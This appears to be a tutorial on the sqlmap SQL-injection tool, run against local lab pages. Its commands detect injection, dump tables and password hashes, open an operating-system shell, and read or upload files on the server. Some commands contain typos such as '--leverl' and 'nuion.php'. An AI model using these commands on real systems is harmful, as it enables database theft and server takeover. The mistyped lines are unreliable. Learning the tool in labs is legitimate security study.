---
title: Using sqlmap
---

# Using sqlmap

## Download sqlmap

Windows version:

[https://github.com/sqlmapproject/sqlmap/zipball/master](https://github.com/sqlmapproject/sqlmap/zipball/master)

Linux version:

[https://github.com/sqlmapproject/sqlmap/tarball/master](https://github.com/sqlmapproject/sqlmap/tarball/master)

## Basics

1. Determine whether injection exists.

```bash
python sqlmap.py -u http://127.0.0.1/sql1/less-1/?id=1 # add double quotes when there are two or more parameters after the injection point
```

2. Determine whether injection exists in a request text file (POST packet captured by Burp).

```bash
python sqlmap.py -r desktop/1.txt  --dbs --batch // text path, usually placed on the desktop for direct scanning
```

3. List all databases under the current user.

```bash
python sqlmap.py -u http://127.0.0.1/sql1/less-1/?id=1 --dbs # when continuing queries, --dbs can be shortened to -D
```

4. Obtain table names in a specified database.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/union.php?id=1" -D dkeye --tables # when continuing queries, --tables can be shortened to -T
```

5. Obtain field names in a table.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/union.php?id=1" -D dkeye -T user_info --columns # when continuing queries, --columns can be shortened to -C
```

6. Obtain field contents.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/union.php?id=1" -D dkeye -T user_info -C username,password --dump
```

7. Obtain all database users. If the current user has permission to read the table containing all users, this can list all administrative users.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1"  --users
```

8. Obtain database user passwords. They are usually MySQL 5 hashes and can be checked with `www.cmd5.com`.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --passwords
```

9. Obtain the current website database name and user name.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --current-db
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --current-user
```

## Advanced

1. `--leverl 5`: detection level. The default is 1. At level 2, HTTP cookies are automatically tested; at level 3, HTTP User-Agent and Referer are tested.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --leverl 5
```

2. Check whether the user has administrator privileges.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --is-dba
```

3. List database administrator roles. This requires permission to read the table of all users and only applies when the current database is Oracle.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --roles
```

4. Forge the Referer.

```bash
--referer http://www.baidu.com
```

5. Run custom SQL statements.

```bash
python sqlmap.py -u "http://127.0.0.1/sql1/nuion.php?id=1" --sql-shell
```

6. Execute arbitrary operating system commands.

```bash
--os-cmd --os-shell
```

7. Read files from the database server.

```shell
python sqlmap.py -u "url" \ --file-read "C:/exaple.exe" -v 1
```

8. Upload files to the database server. This uploads local `test.txt` to `C:/windows/temp` on the target server and renames it to `hack.txt`.

```shell
python sqlmap.py -u "url" --file-write \ test.txt --file-dest "C:/windows/temp/hack.txt" -v 1
```

9. Specify database type, random User-Agent brute forcing, and proxy brute forcing.

```bash
python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/?id=1" --dbms=mysql     # specify the database as MySQL
python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/?id=1" --random-agent   # use a random User-Agent
python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/?id=1" --proxy=PROXY    # use a proxy
-p username  # specify a parameter. If there are multiple parameters and you know username is vulnerable to SQL injection, use -p to specify it for testing
```

## Extra Advanced

Writing tamper bypass scripts. The official project includes 53 of them, but that is still far from enough. I will not continue here; read more and practice more.
